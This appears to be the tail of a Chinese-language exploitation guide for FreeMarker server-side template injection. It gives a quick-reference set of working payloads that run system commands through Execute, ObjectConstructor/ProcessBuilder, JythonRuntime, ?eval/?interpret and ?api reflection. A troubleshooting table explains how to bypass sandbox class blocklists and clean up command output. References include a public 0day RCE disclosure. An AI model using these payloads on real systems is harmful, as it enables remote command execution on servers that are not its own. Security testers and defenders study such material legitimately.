${"freemarker.template.utility.Execute"?new()("id")}      表达式位单行写法
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=oc("java.lang.ProcessBuilder",["sh","-c","id"])>
<#assign br=oc("java.io.BufferedReader",oc("java.io.InputStreamReader",pb.start().getInputStream()))>
${br.readLine()}
<#assign j="freemarker.template.utility.JythonRuntime"?new()>
<@j>import os; os.system("id")</@j>
${payload?interpret} / ${payload?eval}                    二次执行
${bean?api.getClass().getClassLoader()}                   ?api 反射入口（需开启）
<#assign r=x("ls /")?replace("\n"," ")>                   多行折行
<#assign r=x("id")?trim>                                  单行去尾
```

## 8.2 报错速查

| 现象 | 含义 | 处理 |
|---|---|---|
| `Instantiating ... is not allowed` | 命中 SAFER/自建类黑名单 | 换 3.3-3.7 的替代路线 |
| 404 且无堆栈 | 入口骨架校验失败或异常被吞成 404 | 先发形态探针，再逐类探测 |
| 200 + SQL 解析报错 | 命令已执行，输出含换行 | `?trim` / `?replace("\n"," ")` |
| 请求挂死 | `Execute` 多参数写法只执行了首个（如裸 `sh` 等 stdin） | 命令参数合并单字符串 |
| `NoClassDefFoundError: org.python` | JythonRuntime 但无 Jython 依赖 | 换 ProcessBuilder 路线 |
| `getClassLoader()` 为 null | 用了 Bootstrap 加载的 JDK 核心类 | 改用应用自身 POJO |
| `NonHashException` | Scanner 被当集合 | `getMethod().invoke()` 反射调用 |

---

## 参考与延伸阅读

- CN-SEC《[0day] 正方教务管理系统远程命令执行》：`https://cn-sec.com/archives/5416079.html`（本篇实战案例的公开披露源头，含原始报文）
- CSDN《Java 模板注入（FreeMarker）· 利用与绕过：Payload 全集》：`https://blog.csdn.net/2303_82039857/article/details/165349701`（六问清单、版本时间线、`?api` 反射链与坑点的主要参考）
- 先知社区《从 FreeMarker 攻防史到 JeecgBoot 沙箱逃逸 RCE》：`https://xz.aliyun.com/news/92754`（版本演进与攻防史视角）
- FreeMarker 官方文档《Configuring the sandbox / TemplateClassResolver》：`https://freemarker.apache.org/docs/`（`SAFER_RESOLVER`、`ALLOWS_NOTHING_RESOLVER`、`api_builtin_enabled` 的权威说明）
- PayloadsAllTheThings - SSTI (Java)：`https://swisskyrepo.github.io/PayloadsAllTheThings/Server Side Template Injection/Java/`
- CNVD-2026-25909 正方教学管理信息服务平台 SQL 注入漏洞通告
